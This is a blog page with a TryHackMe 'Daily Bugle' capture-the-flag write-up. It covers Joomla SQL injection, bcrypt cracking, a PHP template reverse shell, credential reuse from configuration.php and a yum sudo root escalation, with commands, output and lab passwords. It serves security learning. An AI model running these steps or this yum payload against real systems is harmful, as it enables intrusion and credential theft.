<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="nair0lf32 ">
<meta name="description" content="Enumeration Nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.4 (protocol 2.0)| ssh-hostkey:| 2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbp89KqmXj7Xx84uhisjiT7pGPYepXVTr4MnPu1P4fnlWzevm6BjeQgDBnoRVhddsjHhI1k&#43;xdnahjcv6kykfT3mSeljfy&#43;jRc&#43;2ejMB95oK2AGycavgOfF4FLPYtd5J97WqRmu2ZC2sQUvbGMUsrNaKLAVdWRIqO5OO07WIGtr3c2ZsM417TTcTsSh1Cjhx3F&#43;gbgi0BbBAN3sQqySa91AFruPA&#43;m0R9JnDX5rzXmhWwzAM1Y8R72c4XKXRXdQT9szyyEiEwaXyT0p6XiaaDyxT2WMXTZEBSUKOHUQiUhX7JjBaeVvuX4ITG&#43;W8zpZ6uXUrUySytuzMXlPyfMBy8B| 256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKb&#43;wNoVp40Na4/Ycep7p&#43;&#43;QQiOmDvP550H86ivDdM/7XF9mqOfdhWK0rrvkwq9EDZqibDZr3vL8MtwuMVV5Src=| 256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4TcvlwCGpiawPyNCkuXTK5CCpat&#43;Bv8LycyNdiTJHX80/tcp open http syn-ack Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40| http-robots.txt: 15 disallowed entries| /joomla/administrator/ /administrator/ /bin/ /cache/| /cli/ /components/ /includes/ /installation/ /language/|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA|_http-title: Home| http-methods:|_ Supported Methods: GET HEAD POST OPTIONS|_http-generator: Joomla!" />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/daily-bugle/daily-bugle/" />


    <title>
        
            Daily Bugle :: Zer0ne  — welcome friend
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="https://nair0lf32.github.io/zer0ne/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">



    <link rel="apple-touch-icon" sizes="180x180" href="https://nair0lf32.github.io/zer0ne/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://nair0lf32.github.io/zer0ne/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://nair0lf32.github.io/zer0ne/favicon-16x16.png">
    <link rel="manifest" href="https://nair0lf32.github.io/zer0ne/site.webmanifest">
    <link rel="mask-icon" href="https://nair0lf32.github.io/zer0ne/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="https://nair0lf32.github.io/zer0ne/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="Daily Bugle">
<meta itemprop="description" content="Enumeration Nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.4 (protocol 2.0)| ssh-hostkey:| 2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbp89KqmXj7Xx84uhisjiT7pGPYepXVTr4MnPu1P4fnlWzevm6BjeQgDBnoRVhddsjHhI1k&#43;xdnahjcv6kykfT3mSeljfy&#43;jRc&#43;2ejMB95oK2AGycavgOfF4FLPYtd5J97WqRmu2ZC2sQUvbGMUsrNaKLAVdWRIqO5OO07WIGtr3c2ZsM417TTcTsSh1Cjhx3F&#43;gbgi0BbBAN3sQqySa91AFruPA&#43;m0R9JnDX5rzXmhWwzAM1Y8R72c4XKXRXdQT9szyyEiEwaXyT0p6XiaaDyxT2WMXTZEBSUKOHUQiUhX7JjBaeVvuX4ITG&#43;W8zpZ6uXUrUySytuzMXlPyfMBy8B| 256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKb&#43;wNoVp40Na4/Ycep7p&#43;&#43;QQiOmDvP550H86ivDdM/7XF9mqOfdhWK0rrvkwq9EDZqibDZr3vL8MtwuMVV5Src=| 256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4TcvlwCGpiawPyNCkuXTK5CCpat&#43;Bv8LycyNdiTJHX80/tcp open http syn-ack Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40| http-robots.txt: 15 disallowed entries| /joomla/administrator/ /administrator/ /bin/ /cache/| /cli/ /components/ /includes/ /installation/ /language/|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA|_http-title: Home| http-methods:|_ Supported Methods: GET HEAD POST OPTIONS|_http-generator: Joomla!"><meta itemprop="datePublished" content="2022-09-20T16:00:31+01:00" />
<meta itemprop="dateModified" content="2022-09-20T16:00:31+01:00" />
<meta itemprop="wordCount" content="1534"><meta itemprop="image" content="https://nair0lf32.github.io/zer0ne"/>
<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://nair0lf32.github.io/zer0ne"/>

<meta name="twitter:title" content="Daily Bugle"/>
<meta name="twitter:description" content="Enumeration Nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.4 (protocol 2.0)| ssh-hostkey:| 2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbp89KqmXj7Xx84uhisjiT7pGPYepXVTr4MnPu1P4fnlWzevm6BjeQgDBnoRVhddsjHhI1k&#43;xdnahjcv6kykfT3mSeljfy&#43;jRc&#43;2ejMB95oK2AGycavgOfF4FLPYtd5J97WqRmu2ZC2sQUvbGMUsrNaKLAVdWRIqO5OO07WIGtr3c2ZsM417TTcTsSh1Cjhx3F&#43;gbgi0BbBAN3sQqySa91AFruPA&#43;m0R9JnDX5rzXmhWwzAM1Y8R72c4XKXRXdQT9szyyEiEwaXyT0p6XiaaDyxT2WMXTZEBSUKOHUQiUhX7JjBaeVvuX4ITG&#43;W8zpZ6uXUrUySytuzMXlPyfMBy8B| 256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKb&#43;wNoVp40Na4/Ycep7p&#43;&#43;QQiOmDvP550H86ivDdM/7XF9mqOfdhWK0rrvkwq9EDZqibDZr3vL8MtwuMVV5Src=| 256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4TcvlwCGpiawPyNCkuXTK5CCpat&#43;Bv8LycyNdiTJHX80/tcp open http syn-ack Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40| http-robots.txt: 15 disallowed entries| /joomla/administrator/ /administrator/ /bin/ /cache/| /cli/ /components/ /includes/ /installation/ /language/|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA|_http-title: Home| http-methods:|_ Supported Methods: GET HEAD POST OPTIONS|_http-generator: Joomla!"/>



    <meta property="og:title" content="Daily Bugle" />
<meta property="og:description" content="Enumeration Nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.4 (protocol 2.0)| ssh-hostkey:| 2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbp89KqmXj7Xx84uhisjiT7pGPYepXVTr4MnPu1P4fnlWzevm6BjeQgDBnoRVhddsjHhI1k&#43;xdnahjcv6kykfT3mSeljfy&#43;jRc&#43;2ejMB95oK2AGycavgOfF4FLPYtd5J97WqRmu2ZC2sQUvbGMUsrNaKLAVdWRIqO5OO07WIGtr3c2ZsM417TTcTsSh1Cjhx3F&#43;gbgi0BbBAN3sQqySa91AFruPA&#43;m0R9JnDX5rzXmhWwzAM1Y8R72c4XKXRXdQT9szyyEiEwaXyT0p6XiaaDyxT2WMXTZEBSUKOHUQiUhX7JjBaeVvuX4ITG&#43;W8zpZ6uXUrUySytuzMXlPyfMBy8B| 256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKb&#43;wNoVp40Na4/Ycep7p&#43;&#43;QQiOmDvP550H86ivDdM/7XF9mqOfdhWK0rrvkwq9EDZqibDZr3vL8MtwuMVV5Src=| 256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4TcvlwCGpiawPyNCkuXTK5CCpat&#43;Bv8LycyNdiTJHX80/tcp open http syn-ack Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40| http-robots.txt: 15 disallowed entries| /joomla/administrator/ /administrator/ /bin/ /cache/| /cli/ /components/ /includes/ /installation/ /language/|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA|_http-title: Home| http-methods:|_ Supported Methods: GET HEAD POST OPTIONS|_http-generator: Joomla!" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/daily-bugle/daily-bugle/" /><meta property="og:image" content="https://nair0lf32.github.io/zer0ne"/><meta property="article:section" content="writeups" />
<meta property="article:published_time" content="2022-09-20T16:00:31+01:00" />
<meta property="article:modified_time" content="2022-09-20T16:00:31+01:00" /><meta property="og:site_name" content="Zer0ne" />





    <meta property="article:section" content="TryHackMe" />



    <meta property="article:published_time" content="2022-09-20 16:00:31 &#43;0100 WAT" />










    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="https://nair0lf32.github.io/zer0ne/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">&gt;</span>
            <span class="logo__text">Zer0ne #</span>
            <span class="logo__cursor" style=
                  "
                   background-color:#0FF00D;
                   animation-duration:2s;">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://nair0lf32.github.io/zer0ne/about">About</a></li><li><a href="https://nair0lf32.github.io/zer0ne/posts">Blog</a></li><li><a href="https://nair0lf32.github.io/zer0ne/writeups">Writeups</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/daily-bugle/daily-bugle/">Daily Bugle</a></h2>

            
            
            

            <div class="post-content">
                <!-- raw HTML omitted -->
<h2 id="enumeration">Enumeration</h2>
<h3 id="nmap">Nmap</h3>
<pre tabindex="0"><code>PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbp89KqmXj7Xx84uhisjiT7pGPYepXVTr4MnPu1P4fnlWzevm6BjeQgDBnoRVhddsjHhI1k+xdnahjcv6kykfT3mSeljfy+jRc+2ejMB95oK2AGycavgOfF4FLPYtd5J97WqRmu2ZC2sQUvbGMUsrNaKLAVdWRIqO5OO07WIGtr3c2ZsM417TTcTsSh1Cjhx3F+gbgi0BbBAN3sQqySa91AFruPA+m0R9JnDX5rzXmhWwzAM1Y8R72c4XKXRXdQT9szyyEiEwaXyT0p6XiaaDyxT2WMXTZEBSUKOHUQiUhX7JjBaeVvuX4ITG+W8zpZ6uXUrUySytuzMXlPyfMBy8B
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKb+wNoVp40Na4/Ycep7p++QQiOmDvP550H86ivDdM/7XF9mqOfdhWK0rrvkwq9EDZqibDZr3vL8MtwuMVV5Src=
|   256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4TcvlwCGpiawPyNCkuXTK5CCpat+Bv8LycyNdiTJHX
80/tcp   open  http    syn-ack Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
| http-robots.txt: 15 disallowed entries
| /joomla/administrator/ /administrator/ /bin/ /cache/
| /cli/ /components/ /includes/ /installation/ /language/
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
|_http-title: Home
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: Joomla! - Open Source Content Management
3306/tcp open  mysql   syn-ack MariaDB (unauthorized)
</code></pre><h3 id="ffuf">Ffuf</h3>
<pre tabindex="0"><code>.htaccess               [Status: 403, Size: 211, Words: 15, Lines: 9]
administrator           [Status: 301, Size: 243, Words: 14, Lines: 8]
.htpasswd               [Status: 403, Size: 211, Words: 15, Lines: 9]
.hta                    [Status: 403, Size: 206, Words: 15, Lines: 9]
bin                     [Status: 301, Size: 233, Words: 14, Lines: 8]
cache                   [Status: 301, Size: 235, Words: 14, Lines: 8]
cgi-bin/                [Status: 403, Size: 210, Words: 15, Lines: 9]
components              [Status: 301, Size: 240, Words: 14, Lines: 8]
includes                [Status: 301, Size: 238, Words: 14, Lines: 8]
images                  [Status: 301, Size: 236, Words: 14, Lines: 8]
language                [Status: 301, Size: 238, Words: 14, Lines: 8]
layouts                 [Status: 301, Size: 237, Words: 14, Lines: 8]
libraries               [Status: 301, Size: 239, Words: 14, Lines: 8]
media                   [Status: 301, Size: 235, Words: 14, Lines: 8]
modules                 [Status: 301, Size: 237, Words: 14, Lines: 8]
index.php               [Status: 200, Size: 9280, Words: 441, Lines: 243]
plugins                 [Status: 301, Size: 237, Words: 14, Lines: 8]
robots.txt              [Status: 200, Size: 836, Words: 88, Lines: 33]
templates               [Status: 301, Size: 239, Words: 14, Lines: 8]
tmp                     [Status: 301, Size: 233, Words: 14, Lines: 8]
</code></pre><p>First hard machine</p>
<p>I know I may not be ready yet but I want to see how hard things can get irl</p>
<p>I will do this slowly and use other&rsquo;s walktrough writeups when needed</p>
<p>There is a login page in &ldquo;administrator&rdquo; directory</p>
<p>Its a joomla website but we need the version to search for vulnerabilities</p>
<p>googling &ldquo;how to check joomla version&rdquo; we get</p>
<p><code>http://10.10.100.174/administrator/manifests/files/joomla.xml</code></p>
<pre tabindex="0"><code>files_joomla Joomla! Project admin@joomla.org www.joomla.org (C) 2005 - 2017 Open Source Matters. All rights reserved GNU General Public License version 2 or later; see LICENSE.txt 3.7.0 April 2017 FILES_JOOMLA_XML_DESCRIPTION administrator/components/com_admin/script.php administrator/components/com_admin/sql/updates/mysql administrator/components/com_admin/sql/updates/sqlazure administrator/components/com_admin/sql/updates/sqlazure administrator/components/com_admin/sql/updates/postgresql administrator bin cache cli components images includes language layouts libraries media modules plugins templates tmp htaccess.txt web.config.txt LICENSE.txt README.txt index.php https://update.joomla.org/core/list.xml
</code></pre><p>Joomla 3.7.0</p>
<p>its seems to be vulnerable to sql injection <code>CVE-2017-8917</code></p>
<p>the room suggests not using sqlmap but a python script</p>
<p>we google cve that-specific-cve script and TA-DAA we got a script (hard work lol)</p>
<p>For the sake of credits its: <code>joomblah</code> from stefanlucas (thanks)</p>
<p>this script works better with python2&hellip;I needed to install pip and requests to make it</p>
<pre tabindex="0"><code>curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
python2 get-pip.py
python2 -m pip install requests
</code></pre><p>There is a python 3 version commited by mats-codes (commit #18) but its not complete fix</p>
<p>According to reddit:</p>
<pre tabindex="0"><code>Fix for the joomblah.py script Add .decode(&#39;utf-8&#39;) to the end of line 46 so it looks like this result += value.decode(&#39;utf-8&#39;)
</code></pre><p>Anyway I used the python 2 method and it works</p>
<pre tabindex="0"><code>└──╼ $python2 joomblah.py http://10.10.135.31/

.---. .-&#39;&#39;&#39;-. .-&#39;&#39;&#39;-.
| | &#39; _ \ &#39; _ \ .---.
&#39;---&#39; / /` &#39;. \ / /` &#39;. \ \_\_ ** \_** /| | | .
.---.. | \ &#39; . | \ &#39; | |/ `.&#39; `. || | | .&#39;|
| || &#39; | &#39;| &#39; | &#39;| .-. .-. &#39;|| | | &lt; |
| |\ \ / / \ \ / / | | | | | ||| ** | | ** | |
| | `. ` ..&#39; / `. ` ..&#39; / | | | | | |||/&#39;** &#39;. | | .:--.&#39;. | | .&#39;&#39;&#39;-.
| | &#39;-...-&#39;` &#39;-...-&#39;` | | | | | ||:/` &#39;. &#39;| |/ | \ | | |/.&#39;&#39;&#39;. \ | | | | | | | ||| | || |`&#34; ** | | | / | |
| | |**| |**| |**|||\ / &#39;| | .&#39;.&#39;&#39;| | | | | |
**.&#39; &#39; |/&#39;..&#39; / &#39;---&#39;/ / | |_| | | |
| &#39; &#39; `&#39;-&#39;` \ \._,\ &#39;/| &#39;. | &#39;.
|\_\_\_\_.&#39; `--&#39; `&#34; &#39;---&#39; &#39;---&#39;

[-] Fetching CSRF token
[-] Testing SQLi

- Found table: fb9j5_users
- Extracting users from fb9j5_users
  [$] Found user [&#39;811&#39;, &#39;Super User&#39;, &#39;jonah&#39;, &#39;jonah@tryhackme.com&#39;, &#39;$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm&#39;, &#39;&#39;, &#39;&#39;]
- Extracting sessions from fb9j5_session
</code></pre><p>we get jonah creds but pass is hashed</p>
<p>lets identify the hash</p>
<pre tabindex="0"><code>$haiti &#39;$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm&#39;
bcrypt [HC: 3200] [JtR: bcrypt]
Blowfish(OpenBSD) [HC: 3200] [JtR: bcrypt]
Woltlab Burning Board 4.x
</code></pre><p>BCRYPT??? Oh lord this is why its a hard room</p>
<p>Its gonna take years for me</p>
<pre tabindex="0"><code>hashcat -a 0 -m 3200 &#39;$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm&#39; /usr/share/wordlists/rockyou.txt
</code></pre><p>By God this is painful&hellip;I hash at 13H/s&hellip;I can&rsquo;t go through rockyou with that&hellip;the machine only lasts 1 hour for me (free)</p>
<p>Even with john its slow and takes forever`</p>
<pre tabindex="0"><code>$john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
0g 0:00:01:13 0,02% (ETA: 2021-11-15 23:37) 0g/s 38.93p/s 38.93c/s 38.93C/s skater1..firefly
</code></pre><p>ETA is in 5 days!! 5 fricking daaays XD</p>
<p>I had to look for a writeup that had the answer (close it after you get the pass to limit spoilers)</p>
<p><code>jonah : spiderman123</code></p>
<p>We use those at administrator page and login</p>
<p>immediately look for extensions, plugins or templates pages for uploads or custom code possibilty</p>
<p>in extensions/templates there are 2 templates we can customize</p>
<p>we cant upload directly so we have to modify a page or create one</p>
<p>I created <code>shell.php</code> (what a discrete name)</p>
<p>my activation subdir is <code>/templates/beez3/shell.php</code></p>
<p>I visit that and get access on netcat</p>
<p>ugly shell evolves into better TTY</p>
<pre tabindex="0"><code>sh-4.2$ python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
bash-4.2$
</code></pre><p>we can&rsquo;t get user flag yet</p>
<pre tabindex="0"><code>cd jjameson
bash: cd: jjameson: Permission denied
</code></pre><p>let&rsquo;s check the website directory for creds..as there is a mysql db..the php files might help</p>
<p><code>cat configuration.php</code></p>
<pre tabindex="0"><code>&lt;?php
class JConfig {
        public $offline = &#39;0&#39;;
        public $offline_message = &#39;This site is down for maintenance.&lt;br /&gt;Please check back again soon.&#39;;
        public $display_offline_message = &#39;1&#39;;
        public $offline_image = &#39;&#39;;
        public $sitename = &#39;The Daily Bugle&#39;;
        public $editor = &#39;tinymce&#39;;
        public $captcha = &#39;0&#39;;
        public $list_limit = &#39;20&#39;;
        public $access = &#39;1&#39;;
        public $debug = &#39;0&#39;;
        public $debug_lang = &#39;0&#39;;
        public $dbtype = &#39;mysqli&#39;;
        public $host = &#39;localhost&#39;;
        public $user = &#39;root&#39;;
        public $password = &#39;nv5uz9r3ZEDzVjNu&#39;;
        public $db = &#39;joomla&#39;;
        public $dbprefix = &#39;fb9j5_&#39;;
        public $live_site = &#39;&#39;;
        public $secret = &#39;UAMBRWzHO3oFPmVC&#39;;
        public $gzip = &#39;0&#39;;
        public $error_reporting = &#39;default&#39;;
        public $helpurl = &#39;https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}&#39;;
        public $ftp_host = &#39;127.0.0.1&#39;;
        public $ftp_port = &#39;21&#39;;
        public $ftp_user = &#39;&#39;;
        public $ftp_pass = &#39;&#39;;
        public $ftp_root = &#39;&#39;;
        public $ftp_enable = &#39;0&#39;;
        public $offset = &#39;UTC&#39;;
        public $mailonline = &#39;1&#39;;
        public $mailer = &#39;mail&#39;;
        public $mailfrom = &#39;jonah@tryhackme.com&#39;;
        public $fromname = &#39;The Daily Bugle&#39;;
        public $sendmail = &#39;/usr/sbin/sendmail&#39;;
        public $smtpauth = &#39;0&#39;;
        public $smtpuser = &#39;&#39;;
        public $smtppass = &#39;&#39;;
        public $smtphost = &#39;localhost&#39;;
        public $smtpsecure = &#39;none&#39;;
        public $smtpport = &#39;25&#39;;
        public $caching = &#39;0&#39;;
        public $cache_handler = &#39;file&#39;;
        public $cachetime = &#39;15&#39;;
        public $cache_platformprefix = &#39;0&#39;;
        public $MetaDesc = &#39;New York City tabloid newspaper&#39;;
        public $MetaKeys = &#39;&#39;;
        public $MetaTitle = &#39;1&#39;;
        public $MetaAuthor = &#39;1&#39;;
        public $MetaVersion = &#39;0&#39;;
        public $robots = &#39;&#39;;
        public $sef = &#39;1&#39;;
        public $sef_rewrite = &#39;0&#39;;
        public $sef_suffix = &#39;0&#39;;
        public $unicodeslugs = &#39;0&#39;;
        public $feed_limit = &#39;10&#39;;
        public $feed_email = &#39;none&#39;;
        public $log_path = &#39;/var/www/html/administrator/logs&#39;;
        public $tmp_path = &#39;/var/www/html/tmp&#39;;
        public $lifetime = &#39;15&#39;;
        public $session_handler = &#39;database&#39;;
        public $shared_session = &#39;0&#39;;
</code></pre><p>Maybe jjameson use the same pass for system (and maybe ssh too&hellip;)</p>
<p><code>jjameson : nv5uz9r3ZEDzVjNu</code></p>
<pre tabindex="0"><code>su jjameson
Password: nv5uz9r3ZEDzVjNu

[jjameson@dailybugle html]$
</code></pre><p>now we are good
<code>cat user.txt</code></p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>further privileges are required&hellip;let&rsquo;s evolve again</p>
<pre tabindex="0"><code>sudo -l
Matching Defaults entries for jjameson on dailybugle:
!visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
env_reset, env_keep=&#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&#34;,
env_keep+=&#34;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&#34;,
env_keep+=&#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&#34;,
env_keep+=&#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&#34;,
env_keep+=&#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&#34;,
secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
(ALL) NOPASSWD: /usr/bin/yum
</code></pre><p>Ah yes..the description said something about yum..let&rsquo;s ask gtfobins real quick</p>
<p>He said this:</p>
<pre tabindex="0"><code>TF=$(mktemp -d)
cat &gt;$TF/x&lt;&lt;EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat &gt;$TF/y.conf&lt;&lt;EOF
[main]
enabled=1
EOF

cat &gt;$TF/y.py&lt;&lt;EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version=&#39;2.1&#39;
def init_hook(conduit):
os.execl(&#39;/bin/sh&#39;,&#39;/bin/sh&#39;)
EOF

sudo yum -c $TF/x --enableplugin=y
</code></pre><p>wise words indeed</p>
<pre tabindex="0"><code>sh-4.2# id
uid=0(root) gid=0(root) groupes=0(root)
</code></pre><p>Actually just copy-pasting that works</p>
<p>what this does is basically craft a yum plugin that spawn a shell and enable/load the custom plugin</p>
<p>Alternatively you can craft the plugin on your own side then upload it (see gtfobins again)</p>
<p>Anyway we are done here</p>
<pre tabindex="0"><code>sh-4.2# cd /root
sh-4.2# ls
anaconda-ks.cfg  root.txt
sh-4.2# cat root.txt
</code></pre><p>This was amazing&hellip;I think the main thing that made this HARD is the Bcrypt hash</p>
<p>that single step I could not overcome alone&hellip;my computer and internet were both not good enough</p>
<p>But I think by optimizing my wordlists and creating specific and targeted ones I can bruteforce that</p>
<p>By exemple knowing jonah his password could be anything like..&lsquo;jonah&rsquo;, &lsquo;peter&rsquo;, &lsquo;jameson&rsquo;, &lsquo;dailybugle&rsquo;,&lsquo;spiderman&rsquo;&hellip;</p>
<p>All that mixed with numbers and special chars</p>
<p>But we all know what his biggest obsession is</p>
<p>Dammit peter get him those pictures</p>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="https://nair0lf32.github.io/zer0ne/categories/tryhackme/">TryHackMe</a></span>
        
    </p>

  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2022</span>
            <span><a href="https://nair0lf32.github.io/zer0ne">nair0lf32</a></span>
            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
            <span><a href="https://nair0lf32.github.io/zer0ne/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
            
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
